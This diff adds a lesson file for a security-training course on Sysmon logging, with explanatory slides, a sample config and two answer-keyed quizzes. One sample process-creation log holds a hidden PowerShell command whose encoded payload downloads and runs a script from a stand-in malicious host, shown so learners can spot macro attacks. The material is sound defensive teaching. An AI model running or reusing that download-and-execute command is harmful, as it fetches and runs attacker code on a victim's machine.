@@ -1,0 +1,123 @@
+{
+    "id": "l3",
+    "chapterId": "ch_10",
+    "title": "Sysmon: The Supercharged Log 🚀",
+    "description": "Process creation, network connections, and file creation with full command lines.",
+    "xpReward": 40,
+    "estimatedMinutes": 12,
+    "section": "Windows Logs",
+    "slides": [
+        {
+            "id": "s_l3_1",
+            "type": "text",
+            "title": "What is Sysmon? ⚡",
+            "content": "# The Ultimate Visibility Tool for Windows\n\n**Sysmon** (System Monitor) is a **free** Windows system service and device driver from **Microsoft Sysinternals**.\n\nOnce installed, it **dramatically enhances** Windows logging by providing detailed telemetry that standard Event Logs miss.\n\n**What Sysmon Logs (That Windows Doesn't):**\n- **Event ID 1: Process Creation** (with full command line and hashes).\n- **Event ID 3: Network Connection** (Which process made the connection? To what IP/Port?).\n- **Event ID 7: Image Loaded** (What DLL did the process load?).\n- **Event ID 8: CreateRemoteThread** (Process injection detection).\n- **Event ID 11: FileCreate** (Who created that file in `C:\\Windows\\Temp`?).\n- **Event ID 13: Registry Value Set** (Who modified that Run key?).\n- **Event ID 22: DNS Query** (Which process looked up `evil.com`?).\n\n**Log Location:** `Applications and Services Logs/Microsoft/Windows/Sysmon/Operational`\n\n> **If you can only install ONE additional logging tool on Windows, make it Sysmon.**"
+        },
+        {
+            "id": "s_l3_2",
+            "type": "text",
+            "title": "Sysmon Event ID 1: Process Creation 🏭",
+            "content": "### The Gold Standard of Execution Evidence\n\n**Standard Windows Event 4688** gives you the executable path.\n**Sysmon Event ID 1** gives you:\n- **Full Command Line:** *'powershell.exe -enc SQBFAFgA...'*\n- **Parent Process:** *'winword.exe'* (Critical for tracking macro exploits).\n- **File Hashes:** MD5, SHA256 of the executable.\n- **User:** Who ran it.\n- **Integrity Level:** High/Medium/Low (Did it run as Admin?).\n\n**Example Log Entry (Event ID 1):**\n```text\nProcess Create:\nRuleName: technique_id=T1059.001,technique_name=PowerShell\nUtcTime: 2026-04-20 09:15:22.123\nProcessGuid: {abc123-...}\nProcessId: 4567\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nCommandLine: \"powershell.exe\" -NoP -NonI -W Hidden -Exec Bypass -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AbQBhAGwAaQBjAGkAbwB1AHMALgBjAG8AbQAvAHAAYQB5AGwAbwBhAGQAXQAuAHAAcwAxACcAKQA=\nParentImage: C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\nParentCommandLine: \"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" /n \"C:\\Users\\jsmith\\Downloads\\Invoice_123.docm\"\nUser: CORP\\jsmith\nHashes: SHA256=5B6E6A96B6E6A96B6E6A96B6E6A96B6...\n```\n\n**Analysis:** Word document spawned PowerShell with an encoded command. **This is a confirmed macro exploit.**"
+        },
+        {
+            "id": "s_l3_3",
+            "type": "quiz",
+            "title": "Sysmon Event 1 🎯",
+            "content": "",
+            "quizData": {
+                "id": "q_l3_1",
+                "type": "multiple_choice",
+                "question": "What critical piece of information does Sysmon Event ID 1 provide that standard Windows Event 4688 often misses?",
+                "options": [
+                    {
+                        "id": "opt1",
+                        "text": "The Process ID",
+                        "isCorrect": false
+                    },
+                    {
+                        "id": "opt2",
+                        "text": "The Parent Process",
+                        "isCorrect": true
+                    },
+                    {
+                        "id": "opt3",
+                        "text": "The Time Created",
+                        "isCorrect": false
+                    },
+                    {
+                        "id": "opt4",
+                        "text": "The User Account",
+                        "isCorrect": false
+                    }
+                ],
+                "explanation": "Sysmon records the Parent Process (e.g., `winword.exe` launching `powershell.exe`), which is essential for tracking exploit chains.",
+                "xpReward": 10
+            }
+        },
+        {
+            "id": "s_l3_4",
+            "type": "text",
+            "title": "Sysmon Event ID 3: Network Connection 🌐",
+            "content": "### Mapping Process to Traffic\n\n**Standard Firewall Logs** tell you: `192.168.1.100 connected to 185.142.53.179:443`.\n**Sysmon Event ID 3** tells you: **`powershell.exe` (PID 4567)** connected to `185.142.53.179:443`.\n\n**This is the missing link.** It connects the **process** to the **network traffic**.\n\n**Key Fields in Event ID 3:**\n- **Image:** `powershell.exe`\n- **ProcessId:** `4567`\n- **SourceIp:** `192.168.1.100`\n- **DestinationIp:** `185.142.53.179`\n- **DestinationPort:** `443`\n- **Protocol:** `TCP`\n- **Initiated:** `true` (Was the connection outbound?)\n\n**IR Use Case:** You see an alert for a connection to a known C2 IP. You search Sysmon Event ID 3 for that IP. You find the `ProcessId` and `Image`. You pivot to Sysmon Event ID 1 for that `ProcessId` to see the **full command line** that launched it.\n\n**Query:** *'Show me all outbound connections to port 443 not made by standard browsers.'*"
+        },
+        {
+            "id": "s_l3_5",
+            "type": "text",
+            "title": "Sysmon Event ID 11: FileCreate 📁",
+            "content": "### Tracking Malware Drops\n\n**Standard Windows Auditing** can track file creation, but it's noisy and complex to configure.\n**Sysmon Event ID 11** provides a clean, targeted log of file creation events.\n\n**Key Fields:**\n- **Image:** `chrome.exe` (The process creating the file).\n- **TargetFilename:** `C:\\Users\\jsmith\\Downloads\\Invoice_123.docm`\n- **CreationUtcTime:** Timestamp.\n\n**Why This Matters:**\n- **Dropped Malware:** Did `winword.exe` drop `evil.dll` in `C:\\Users\\Public\\Documents`?\n- **Ransomware Note:** Did `unknown.exe` create `README_DECRYPT.txt`?\n- **Web Downloads:** Track every file downloaded from the browser.\n\n**Hunting Query:** *'Show me all `.exe` or `.dll` files created in `C:\\Users\\Public` in the last 24 hours.'*"
+        },
+        {
+            "id": "s_l3_6",
+            "type": "text",
+            "title": "Sysmon Event ID 7: Image Loaded (DLLs) 📚",
+            "content": "### Detecting DLL Hijacking and Injection\n\nAttackers often load malicious DLLs into legitimate processes to hide their code.\n\n**Event ID 7 logs every DLL loaded by a process.**\n\n**Key Fields:**\n- **Image:** `explorer.exe` (The process loading the DLL).\n- **ImageLoaded:** `C:\\Windows\\Temp\\evil.dll`\n- **Signed:** `false` (Is the DLL digitally signed?).\n\n**Detection Logic:**\n- *'Show me any unsigned DLL loaded into `explorer.exe` from a Temp directory.'*\n- *'Show me any DLL loaded from `C:\\Users\\Public`.'*\n\n**This event is **extremely high volume**. You need a **Sysmon Config** to filter out known good DLLs (e.g., `kernel32.dll`) to make it manageable.**"
+        },
+        {
+            "id": "s_l3_7",
+            "type": "code",
+            "title": "Example: Deploying a Sysmon Config 🛠️",
+            "content": "Sysmon relies on a **configuration file** (XML) to tell it *what* to log and *what to filter out*.\n\n**Install Sysmon with a Community Config:**\n```cmd\nSysmon64.exe -accepteula -i sysmonconfig-export.xml\n```\n\n**Recommended Community Configs:**\n- **SwiftOnSecurity Sysmon Config:** A popular, well-documented starter config.\n- **Olaf Hartong's Sysmon-Modular:** Advanced, ATT&CK-mapped config.\n\n**Simple Config Snippet (Exclude common noise):**\n```xml\n<Sysmon schemaversion=\"4.30\">\n  <EventFiltering>\n    <!-- Log ALL process creation -->\n    <ProcessCreate onmatch=\"exclude\"/>\n    \n    <!-- Log network connections, but exclude known good browsers -->\n    <NetworkConnect onmatch=\"exclude\">\n      <Image condition=\"end with\">chrome.exe</Image>\n      <Image condition=\"end with\">firefox.exe</Image>\n      <Image condition=\"end with\">msedge.exe</Image>\n    </NetworkConnect>\n  </EventFiltering>\n</Sysmon>\n```\n\n**Update Config Remotely:**\n```cmd\nSysmon64.exe -c sysmonconfig-export.xml\n```"
+        },
+        {
+            "id": "s_l3_8",
+            "type": "tip",
+            "title": "Pro Tip: Sysmon + Event ID 22 (DNS) 📡",
+            "content": "## The Silent Hunter\n\n**Event ID 22** logs **DNS queries** mapped to the process that made them.\n\n**Why is this a game-changer?**\n- **Network Firewalls** only see the **IP address** after DNS resolution.\n- **Sysmon sees the domain name `evil-c2.xyz` BEFORE resolution.**\n- Even if the attacker uses **DNS over HTTPS (DoH)** in the browser, if the malware uses the standard Windows DNS resolver, Sysmon **still sees it**.\n\n**Hunting for DGA Domains:**\n*'Show me processes making DNS queries for domains with high entropy (random-looking strings).'*\n\n**Example:** `pwrshell.exe` queried `a8f3b2c1d4e5.com`. **This is a dead giveaway.**"
+        },
+        {
+            "id": "s_l3_9",
+            "type": "quiz",
+            "title": "Sysmon Event Matching 🧩",
+            "content": "",
+            "quizData": {
+                "id": "q_l3_2",
+                "type": "multiple_choice",
+                "question": "You need to prove that `powershell.exe` made an outbound connection to a known malicious IP. Which Sysmon Event ID provides this correlation?",
+                "options": [
+                    {
+                        "id": "opt1",
+                        "text": "Event ID 1 (Process Creation)",
+                        "isCorrect": false
+                    },
+                    {
+                        "id": "opt2",
+                        "text": "Event ID 3 (Network Connection)",
+                        "isCorrect": true
+                    },
+                    {
+                        "id": "opt3",
+                        "text": "Event ID 11 (File Creation)",
+                        "isCorrect": false
+                    },
+                    {
+                        "id": "opt4",
+                        "text": "Event ID 7 (Image Loaded)",
+                        "isCorrect": false
+                    }
+                ],
+                "explanation": "Event ID 3 logs network connections and includes the Image (process name) and ProcessId.",
+                "xpReward": 10
+            }
+        }
+    ]
+}
